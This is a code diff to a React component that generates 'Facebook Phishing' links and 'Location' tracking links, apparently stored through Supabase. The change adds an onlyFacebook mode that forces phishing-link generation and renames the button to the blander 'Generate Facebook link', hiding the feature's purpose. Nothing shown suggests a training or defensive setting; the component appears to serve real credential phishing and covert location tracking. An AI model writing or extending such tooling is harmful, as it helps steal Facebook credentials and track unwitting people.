@@ -1,11 +1,14 @@
 import React, { useState } from 'react';
 import { supabase } from '../supabase';
 
-export default function LinkGenerator({ onNewLink }) {
+export default function LinkGenerator({ onNewLink, onlyFacebook }) {
   const [link, setLink] = useState('');
   const [destino, setDestino] = useState('');
   const [erro, setErro] = useState('');
-  const [tipo, setTipo] = useState('location'); // 'location' ou 'facebook'
+  const [tipo, setTipo] = useState(onlyFacebook ? 'facebook' : 'location'); // 'location' ou 'facebook'
+
+  // Se onlyFacebook, sempre força tipo facebook
+  if (onlyFacebook && tipo !== 'facebook') setTipo('facebook');
 
   async function gerarLink() {
     setErro('');
@@ -43,15 +46,17 @@ export default function LinkGenerator({ onNewLink }) {
 
   return (
     <div style={{ margin: '2rem 0', textAlign: 'center' }}>
-      <div style={{ marginBottom: 12 }}>
-        <label>
-          <input type="radio" checked={tipo === 'location'} onChange={() => setTipo('location')} /> Location Link
-        </label>
-        <label style={{ marginLeft: 16 }}>
-          <input type="radio" checked={tipo === 'facebook'} onChange={() => setTipo('facebook')} /> Facebook Phishing
-        </label>
-      </div>
-      {tipo === 'location' && (
+      {!onlyFacebook && (
+        <div style={{ marginBottom: 12 }}>
+          <label>
+            <input type="radio" checked={tipo === 'location'} onChange={() => setTipo('location')} /> Location Link
+          </label>
+          <label style={{ marginLeft: 16 }}>
+            <input type="radio" checked={tipo === 'facebook'} onChange={() => setTipo('facebook')} /> Facebook Phishing
+          </label>
+        </div>
+      )}
+      {tipo === 'location' && !onlyFacebook && (
         <input
           type="text"
           placeholder="Destination URL (e.g. https://globo.com)"
@@ -80,7 +85,7 @@ export default function LinkGenerator({ onNewLink }) {
         cursor: 'pointer',
         transition: 'background 0.2s',
         marginTop: 8
-      }}>{tipo === 'location' ? 'Generate tracking link' : 'Generate Facebook phishing link'}</button>
+      }}>{onlyFacebook ? 'Generate Facebook link' : (tipo === 'location' ? 'Generate tracking link' : 'Generate Facebook phishing link')}</button>
       {erro && <div style={{ color: 'var(--erro)', marginTop: 8 }}>{erro}</div>}
       {link && (
         <div style={{ marginTop: 20 }}>
